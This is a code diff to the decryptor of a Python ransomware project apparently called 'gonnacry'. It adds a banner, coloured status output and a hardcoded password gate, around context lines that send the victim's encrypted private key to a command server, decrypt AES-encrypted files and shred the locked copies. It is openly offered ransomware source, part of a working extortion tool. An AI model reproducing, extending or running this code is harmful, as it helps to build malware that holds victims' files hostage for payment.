@@ -13,6 +13,23 @@ from Crypto.Cipher import PKCS1_OAEP
 import string 
 import random
 
+
+logo = """
+  ▄████  ▒█████   ███▄    █  ███▄    █  ▄▄▄       ▄████▄   ██▀███ ▓██   ██▓
+ ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █  ██ ▀█   █ ▒████▄    ▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒
+▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒▓██  ▀█ ██▒▒██  ▀█▄  ▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░
+░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒▓██▒  ▐▌██▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░
+░▒▓███▀▒░ ████▓▒░▒██░   ▓██░▒██░   ▓██░ ▓█   ▓██▒▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░
+ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒ 
+  ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░░   ░ ▒░  ▒   ▒▒ ░  ░  ▒     ░▒ ░ ▒░▓██ ░▒░ 
+░ ░   ░ ░ ░ ░ ▒     ░   ░ ░    ░   ░ ░   ░   ▒   ░          ░░   ░ ▒ ▒ ░░  
+      ░     ░ ░           ░          ░       ░  ░░ ░         ░     ░ ░     
+                                                 ░                 ░ ░     
+"""
+
+
+BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
+
 # enviroment paths
 ransomware_name = ("gonnacry")
 server_address = ("http://localhost:8000")
@@ -71,21 +88,25 @@ def payment():
 def menu():
 
     # import the private key
+    print("{}Importing the encrypted client private key".format(WHITE))
     with open(ransomware_path + '/encrypted_client_private_key.key', 'rb') as f:
         encrypted_client_private_key = pickle.load(f)
+    print("{}OK{}".format(GREEN, WHITE))
 
     key_to_be_sent = base64.b64encode(str(encrypted_client_private_key))
 
     # send to server to be decrypted
     while True:
         try:
+            print("Requesting to server to decrypt the private key")
             client_private_key = send_to_server_encrypted_private_key(machine_id, key_to_be_sent)
             break
         except:
-            print("No connection, sleeping for 2 minutes")
+            print("{}No connection, sleeping for 2 minutes\nConnect to internet to get your files back!{}".format(RED, WHITE))
             time.sleep(120)
 
     # saving to disk the private key
+    print("{}Client private key decrypted and stored to disk{}".format(GREEN, WHITE))
     with open(ransomware_path + "/client_private_key.PEM", 'wb') as f:
         f.write(client_private_key)
 
@@ -94,6 +115,7 @@ def menu():
         content = f.read()
      
     # get the aes keys and IV's and paths back
+    print('Decrypting the files ...')
     content = content.split('\n')
     content.remove('')
     aes_and_path = []
@@ -122,6 +144,16 @@ def menu():
         shred(_[1])
 
     # end of decryptor
+    print("{}Decryption finished!{}".format(GREEN, WHITE))
 
 if __name__ == "__main__": 
-    menu()
+    print(logo)
+    while True:
+        password = "na beira do rio"
+        passs = raw_input('Enter the key: {}'.format(MAGENTA))
+        if(passs == password):
+            menu()
+            break
+        else:
+            print('{}wrong password{}'.format(RED, WHITE))
+            continue
